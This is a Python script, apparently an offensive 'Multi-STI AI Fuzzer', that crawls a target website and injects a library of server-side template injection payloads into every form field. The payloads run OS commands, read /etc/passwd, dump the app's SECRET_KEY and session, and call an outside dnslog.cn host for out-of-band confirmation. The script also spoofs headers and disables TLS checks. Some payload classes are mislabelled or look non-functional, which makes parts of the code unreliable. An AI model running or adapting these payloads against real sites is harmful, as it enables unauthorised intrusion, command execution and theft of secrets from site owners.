#!/usr/bin/env python3
# ════════════════════════════════════════════════════════════════════════════
# Multi-STI AI Fuzzer (v1.0-dev, 2025-05-10)
# Author : Haroon Ahmad Awan · CyberZeus <haroon@cyberzeus.pk>
# Now supports:
#  • SSTI (Server-Side Template Injection)
#  • BSTI (Bytecode-Level Template Injection)
#  • MSTI (Macro-Level Template Injection)
#  • ASTI (AST-Level Template Injection)
#  • FSTI (Filter-Pipeline Template Injection)
#  • GSTI (Global Context Template Injection)
# ════════════════════════════════════════════════════════════════════════════

import os
import sys
import ssl
import time
import random
import string
import logging
import warnings
import argparse
import urllib.parse
import requests
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

# Optional AI extensions
USE_CODEBERT = False
try:
    from transformers import AutoTokenizer, AutoModelForMaskedLM
    TOKENIZER = AutoTokenizer.from_pretrained("microsoft/codebert-base")
    MODEL     = AutoModelForMaskedLM.from_pretrained("microsoft/codebert-base")
    MODEL.eval()
    USE_CODEBERT = True
except:
    pass

# Optional dynamic crawling
HAVE_PLAYWRIGHT = False
try:
    from playwright.sync_api import sync_playwright
    HAVE_PLAYWRIGHT = True
except:
    pass

# ─────────────────────────────────────────────────────────────────────────────
VERSION       = "1.0-dev"
RAND          = ''.join(random.choices(string.ascii_lowercase, k=5))
MARK          = f"cyz{RAND}"
A, B          = random.randint(6,9), random.randint(11,14)
PRODUCT       = str(A*B)
DNSLOG        = f"sti{random.randint(1000,9999)}.dnslog.cn"
DNSLOG_DOMAIN = DNSLOG  # alias for backward compatibility
LOGFILE       = Path("sti_results.md")
TIMEOUT       = 6
MAX_PAGES     = 100
THREADS       = 18
JITTER        = (0.2, 0.8)

# ── CLI ──────────────────────────────────────────────────────────────────────
parser = argparse.ArgumentParser()
parser.add_argument("-u","--url", required=True, help="Target URL")
parser.add_argument("--threads", type=int, default=THREADS)
parser.add_argument("--max", type=int, default=MAX_PAGES)
parser.add_argument("--no-browser", action="store_true")
parser.add_argument("--debug", action="store_true")
args = parser.parse_args()

logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO,
                    format="%(levelname)s: %(message)s")
warnings.filterwarnings("ignore")
ssl._create_default_https_context = ssl._create_unverified_context

def ai_extend(base: str, top=2):
    """
    Single, fixed version of the AI-based extension function.
    Looks for a single {MASK} in base and replaces it with top tokens.
    """
    if not USE_CODEBERT or MARK not in base:
        return []
    # Replace the custom marker with a {MASK} token
    masked = base.replace(MARK, f"{MARK}{{MASK}}")
    ids = TOKENIZER.encode(masked, return_tensors="pt")

    # Find positions of the mask token
    mask_positions = (ids == TOKENIZER.mask_token_id).nonzero(as_tuple=True)
    # If we didn't actually find a [MASK], abort
    if len(mask_positions[0]) == 0:
        return []

    # We only handle the first mask position for simplicity
    mask_idx = mask_positions[1][0].item()

    # Logits for that position
    logits = MODEL(ids).logits[0, mask_idx]
    preds = logits.topk(top).indices.tolist()

    # Replace {MASK} with each top predicted token
    extended = []
    for p in preds:
        guess = TOKENIZER.decode([p]).strip()
        candidate = masked.replace("{MASK}", guess)
        extended.append(candidate)
    return extended

# ════════════════════════════════════════════════════════════════════════════
# Payload library by class
# ════════════════════════════════════════════════════════════════════════════
CORES = []

# --- SSTI cores (classic & advanced) ---
CORES += [
    # basic reflection
    f"{{{{'{MARK}'}}}}",
    f"{{{{ '{MARK}' |safe }}}}",
    f"{{{{ {A}*{B} }}}}",
    f"$({{{MARK}}})",
    # standard introspection
    "{{ request.args }}",
    "{{ config['SECRET_KEY'] }}",
    "{{ session }}",
    "{{ url_for('static', filename='') }}",
    "{{ request.path }}",
    # simple command exec
    "{{ ''.__class__.__mro__[1].__subclasses__()[40]('uname -a') }}",
    # file read
    "{{ ''.__class__.__mro__[2].__subclasses__()[59]('/etc/passwd').read() }}",
    # HTTP fetch
    "{{ __import__('requests').get('http://%s') }}" % DNSLOG
]

# --- BSTI cores (bytecode-level) ---
CORES += [
    # overwrite constant table to exec 'echo BSTI'
    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('echo BSTI') }}",
    # corrupt bytecode header via char codes
    "{{ config.__class__.__mro__[1].__subclasses__()[0]('\\x65\\x63\\x68\\x6f BSTI') }}",
    # constant-table swap
    "{{ (lambda:0).__code__.co_consts[1]('echo BSTI') }}",
    # bytecode header smash
    "{{ compile('import os;os.system(\\'echo BSTI\\')','<string>','exec') }}"
]

# --- MSTI cores (macro-level) ---
CORES += [
    # shadow-safe macro override
    "{% macro evil() %}{{ request.application.__globals__.os.system('echo MSTI') }}{% endmacro %}",
    # import-poison macro
    "{% from 'base.html' import safe %}{{ safe(class_='__import__(\\'os\\').popen(\\'echo MSTI\\')') }}",
    # parameter-poisoned macro
    "{% macro leak(data) %}{{ data|tojson }}{% endmacro %}{{ leak(__import__('os').popen('echo MSTI').read()) }}",
    # recursive macro DOS + escape
    "{% macro r(i) %}{% if i>0 %}{{ r(i-1) }}{% else %}{{ __import__('os').system('echo MSTI') }}{% endif %}{% endmacro %}{{ r(5) }}"
]

# --- ASTI cores (AST-manipulation) ---
CORES += [
    # fake If node executing os.system
    f"{{% if {A}=={B} %}}{{{{ __import__('os').system('echo ASTI') }}}}{{% endif %}}",
    # dummy AST transformer call
    "{{ self.__class__.__mro__[0].__subclasses__()[59]('import ast;print(ast.dump(__loader__))') }}",
    # modify AST constants
    "{{ compile('print(\\'ASTI\\')','<ast>','exec') }}",
    # inject custom node
    "{{ ''.__class__.__mro__[2].__subclasses__()[59]('from ast import parse;print(parse(\\'1+1\\'))') }}"
]

# --- FSTI cores (filter-pipeline) ---
CORES += [
    # alias 'safe' filter to os.popen
    "{{ 'X'|safe }}",
    # pipeline break fallback
    "{{ ('').__class__.__mro__[1].__subclasses__()[59]('echo FSTI')|length }}",
    # custom filter injection
    "{{ ('cyz').upper|lower|__class__.__mro__[0].__subclasses__()[40]('echo FSTI') }}",
    # chained filters
    "{{ 'ping -c1 %s'|urlencode|__class__.__mro__[1].__subclasses__()[59] }}" % DNSLOG_DOMAIN
]

# --- GSTI cores (global-context) ---
CORES += [
    # hijack builtins.eval to run system
    "{{ __builtins__['eval']('os.system(\\'echo GSTI\\')') }}",
    # pre-render hook via sys.modules
    "{{ getattr(sys,'modules')['builtins'].__dict__.setdefault('exec',__import__('os').system)('echo GSTI-HOOK') }}",
    # global config overwrite
    "{{ config.__class__.__mro__[1].__subclasses__()[0].__globals__['os'].system('echo GSTI') }}",
    # insert global variable
    "{{ globals().update({'evil':'1'}) or __import__('os').system('echo GSTI') }}"
]

# --- New VSTI cores (View-level Template Injection) ---
CORES += [
    # inject into view renderer
    "{{ render_template('__import__(\\'os\\').popen(\\'echo VSTI\\')') }}",
    # override view function
    "{% set view = __import__('os').system %}{{ view('echo VSTI') }}"
]

print(f"[+] CORES loaded: {len(CORES)} unique payload cores")

# ════════════════════════════════════════════════════════════════════════════
def mutate(payload):
    enc = urllib.parse.quote_plus(payload)
    return [
        payload,
        enc,
        ''.join(f"\\x{ord(c):02x}" for c in payload),
        payload + "%00",
        f"<!--{payload}-->"
    ]

def build_payloads():
    pset = set()
    for core in CORES:
        # Basic mutations
        for v in mutate(core):
            pset.add(v)
        # AI-based guesses
        for ext in ai_extend(core):
            # Also mutate each AI-based guess
            for m in mutate(ext):
                pset.add(m)
    lst = list(pset)
    random.shuffle(lst)
    # Limit for safety or speed
    return lst[:200]

PAYLOADS = build_payloads()

# ════════════════════════════════════════════════════════════════════════════
def log_hit(url, param, payload, style):
    entry = f"- **{style}** `{url}` • **{param}** → `{payload}`\n"
    with LOGFILE.open("a") as f:
        f.write(entry)
    logging.info(entry.strip())

def rand_headers():
    ua = UserAgent()
    return {
        "User-Agent": ua.random,
        "X-Forwarded-For": f"127.0.0.{random.randint(2,254)}",
        "Referer": random.choice(["https://google.com","https://bing.com"])
    }

def smart_url(u):
    if u.startswith("http"): 
        return u
    return "https://" + u

def fuzz_target(tgt):
    url, method, params = tgt["url"], tgt["method"], tgt["params"]
    for p in params:
        for pl in PAYLOADS:
            data = {k: (pl if k == p else "test") for k in params}
            try:
                if method == "GET":
                    r = requests.get(url, params=data, headers=rand_headers(), timeout=TIMEOUT)
                else:
                    r = requests.post(url, data=data, headers=rand_headers(), timeout=TIMEOUT)
                body = r.text
                # detect by marker or DNS OOB
                if MARK in body:
                    log_hit(url, p, pl, "REFLECT")
                    break
                if DNSLOG in body:
                    log_hit(url, p, pl, "OOB")
                    break
            except:
                continue

def crawl_static(root):
    out = []
    dom = urllib.parse.urlparse(root).netloc
    seen, q = set(), [root]
    while q and len(seen)<args.max:
        u = q.pop(0)
        if u in seen: 
            continue
        seen.add(u)
        try:
            r = requests.get(u, headers=rand_headers(), timeout=TIMEOUT)
            if "text/html" not in r.headers.get("Content-Type",""):
                continue
            soup = BeautifulSoup(r.text,"html.parser")
            # gather forms
            for f in soup.find_all("form"):
                act = f.get("action") or u
                params = [i.get("name") for i in f.find_all(["input","textarea"],{"name":True})]
                out.append({
                    "url": urllib.parse.urljoin(u, act),
                    "method": f.get("method","GET").upper(),
                    "params": params
                })
            # gather links
            for a in soup.find_all("a", href=True):
                full = urllib.parse.urljoin(u, a["href"])
                if urllib.parse.urlparse(full).netloc == dom:
                    q.append(full)
        except:
            pass
    return out

def crawl_dynamic(root):
    if not HAVE_PLAYWRIGHT or args.no_browser: 
        return []
    hits = set()
    with sync_playwright() as p:
        browser = p.firefox.launch(headless=True)
        page = browser.new_page()
        page.goto(root, wait_until="networkidle")
        # Potentially collect dynamic endpoints or forms here
        browser.close()
    return list(hits)

def main():
    if not LOGFILE.exists():
        LOGFILE.write_text(f"# Multi-STI Findings v{VERSION}\n\n")
    root = smart_url(args.url.rstrip("/"))
    logging.info(f"[*] Target: {root}  Marker: {MARK}  DNSLog: {DNSLOG}")

    # Crawl
    tgts = crawl_static(root) + crawl_dynamic(root)
    uniq = {}
    for t in tgts:
        key = (t["url"], t["method"])
        uniq.setdefault(key, set()).update(t["params"])

    merged = [{"url":k[0], "method":k[1], "params":list(v)} for k,v in uniq.items()]
    logging.info(f"[+] Endpoints: {len(merged)}")

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        pool.map(fuzz_target, merged)

    logging.info(f"[✓] Done. Results in {LOGFILE.resolve()}")

if __name__=="__main__":
    main()
